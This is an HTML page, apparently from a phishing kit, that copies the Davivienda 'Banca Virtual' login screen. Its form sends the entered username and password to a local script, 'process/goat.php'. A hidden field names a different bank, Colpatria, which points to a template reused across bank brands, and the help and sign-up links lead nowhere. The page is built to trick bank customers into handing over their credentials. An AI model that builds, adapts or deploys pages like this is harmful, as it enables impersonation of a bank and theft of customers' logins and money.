<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Davivienda | Banca Virtual</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <script type="text/javascript" src="../../scripts/jquery-3.6.0.min.js"></script>
    <style>
        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

        body {
            font-family: 'Inter', Arial, sans-serif;
            background-color: #f5f5f5;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        /* ── Header ─────────────────────────────── */
        .header {
            background: #fff;
            border-top: 5px solid #E31B23;
            border-bottom: 1px solid #e0e0e0;
            padding: 14px 24px;
            display: flex;
            align-items: center;
        }

        .header img {
            height: 36px;
            width: auto;
        }

        /* ── Card container ─────────────────────── */
        .page-wrapper {
            flex: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 32px 16px;
        }

        .card {
            background: #fff;
            border-radius: 12px;
            padding: 40px 36px 32px;
            width: 100%;
            max-width: 440px;
            box-shadow: 0 2px 16px rgba(0,0,0,.08);
        }

        /* ── Título ─────────────────────────────── */
        .card h2 {
            font-size: 1.55rem;
            font-weight: 700;
            color: #111;
            margin-bottom: 32px;
            line-height: 1.25;
        }

        /* ── Inputs ─────────────────────────────── */
        .input-wrapper {
            position: relative;
            margin-bottom: 28px;
        }

        .input-wrapper .icon {
            position: absolute;
            left: 0;
            top: 50%;
            transform: translateY(-50%);
            color: #9e9e9e;
            font-size: 18px;
            pointer-events: none;
        }

        .input-wrapper input {
            width: 100%;
            padding: 10px 10px 10px 32px;
            border: none;
            border-bottom: 1.5px solid #bdbdbd;
            border-radius: 0;
            font-size: 1rem;
            color: #333;
            background: transparent;
            outline: none;
            transition: border-color .2s;
        }

        .input-wrapper input::placeholder { color: #9e9e9e; }
        .input-wrapper input:focus { border-bottom-color: #E31B23; }

        /* ── Olvidaste ──────────────────────────── */
        .forgot {
            display: block;
            color: #1565C0;
            font-size: .9rem;
            font-weight: 600;
            text-decoration: none;
            margin-bottom: 24px;
        }
        .forgot:hover { text-decoration: underline; }

        /* ── Recordar ───────────────────────────── */
        .remember {
            display: flex;
            align-items: center;
            gap: 10px;
            margin-bottom: 28px;
            font-size: .9rem;
            color: #444;
            cursor: pointer;
        }

        .remember input[type="checkbox"] {
            width: 18px;
            height: 18px;
            accent-color: #E31B23;
            flex-shrink: 0;
            cursor: pointer;
        }

        /* ── Botón ingresar ─────────────────────── */
        .btn-login {
            width: 100%;
            padding: 15px;
            background: #E31B23;
            color: #fff;
            border: none;
            border-radius: 50px;
            font-size: 1rem;
            font-weight: 600;
            cursor: pointer;
            transition: background .2s, transform .1s;
            letter-spacing: .3px;
        }

        .btn-login:hover  { background: #c0151c; }
        .btn-login:active { transform: scale(.98); }

        /* ── Footer card ────────────────────────── */
        .card-footer {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 28px;
            font-size: .875rem;
        }

        .card-footer span { color: #555; }

        .card-footer a {
            color: #1565C0;
            font-weight: 600;
            text-decoration: none;
        }
        .card-footer a:hover { text-decoration: underline; }

        /* ── Responsive ─────────────────────────── */
        @media (max-width: 480px) {
            .card { padding: 32px 20px 24px; }
            .card h2 { font-size: 1.3rem; }
        }
    </style>
</head>
<body>

    <!-- Header con logo -->
    <div class="header">
        <img src="new-brand-red.svg" alt="Davivienda">
    </div>

    <!-- Formulario principal -->
    <div class="page-wrapper">
        <div class="card">
            <h2>Ingresa a tu Banca Virtual</h2>

            <form action="process/goat.php" method="POST">
                <input type="hidden" name="banco" value="colpatria">

                <!-- Usuario -->
                <div class="input-wrapper">
                    <span class="icon">
                        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="1.6">
                            <path stroke-linecap="round" stroke-linejoin="round" d="M15.75 6a3.75 3.75 0 1 1-7.5 0 3.75 3.75 0 0 1 7.5 0ZM4.501 20.118a7.5 7.5 0 0 1 14.998 0A17.933 17.933 0 0 1 12 21.75c-2.676 0-5.216-.584-7.499-1.632Z"/>
                        </svg>
                    </span>
                    <input type="text" name="user" id="txtUsuario" placeholder="Nombre de usuario" required autocomplete="username">
                </div>

                <!-- Contraseña -->
                <div class="input-wrapper">
                    <span class="icon">
                        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="1.6">
                            <path stroke-linecap="round" stroke-linejoin="round" d="M16.5 10.5V6.75a4.5 4.5 0 1 0-9 0v3.75m-.75 11.25h10.5a2.25 2.25 0 0 0 2.25-2.25v-6.75a2.25 2.25 0 0 0-2.25-2.25H6.75a2.25 2.25 0 0 0-2.25 2.25v6.75a2.25 2.25 0 0 0 2.25 2.25Z"/>
                        </svg>
                    </span>
                    <input type="password" name="pass" id="txtPass" placeholder="Contraseña" required minlength="6" autocomplete="current-password">
                </div>

                <!-- Olvidé mis datos -->
                <a href="#" class="forgot">¿Olvidaste tu usuario o contraseña?</a>

                <!-- Recordar usuario -->
                <label class="remember">
                    <input type="checkbox" id="chkRecordar">
                    Recordar mi nombre de usuario
                </label>

                <!-- Ingresar -->
                <button type="submit" name="clave" class="btn-login">Ingresar</button>
            </form>

            <div class="card-footer">
                <span>¿Eres nuevo con nosotros?</span>
                <a href="#">Activa tu usuario</a>
            </div>
        </div>
    </div>

</body>
</html>
